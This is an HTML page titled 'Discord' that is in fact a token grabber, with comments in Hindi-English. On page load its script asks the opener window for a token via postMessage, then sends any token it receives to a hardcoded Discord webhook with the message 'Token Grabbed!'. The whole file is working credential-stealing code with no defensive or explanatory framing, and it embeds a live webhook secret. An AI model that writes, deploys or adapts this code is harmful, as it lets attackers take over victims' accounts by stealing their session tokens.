<!DOCTYPE html>
<html>
<head>
    <title>Discord</title>
    <script>
        // Aapka Webhook URL
        const webhookUrl = "https://discord.com/api/webhooks/1539915355064107059/_5C42_2PPDLG9f3Oy59oVE-yf_HDH2oP7sD71L6OZJRsTdOmyVEV0IsOA8d2jAS_cI51";

        // Parent window se token request karein
        window.addEventListener('message', (event) => {
            if (event.data && event.data.token) {
                console.log("Token received from parent:", event.data.token);
                sendTokenToDiscord(event.data.token);
            }
        });

        // Token bhejne ka function
        async function sendTokenToDiscord(token) {
            try {
                await fetch(webhookUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: `🔓 **Token Grabbed!**\n\`\`\`${token}\`\`\``
                    })
                });
                console.log("Token sent successfully.");
            } catch (error) {
                console.error("Failed to send token:", error);
            }
        }

        // Jab page load ho, parent window se token maango
        window.onload = () => {
            if (window.opener) {
                window.opener.postMessage({ type: 'get_token' }, '*');
            } else {
                console.log("No opener window found.");
            }
        };
    </script>
</head>
<body></body>
</html>
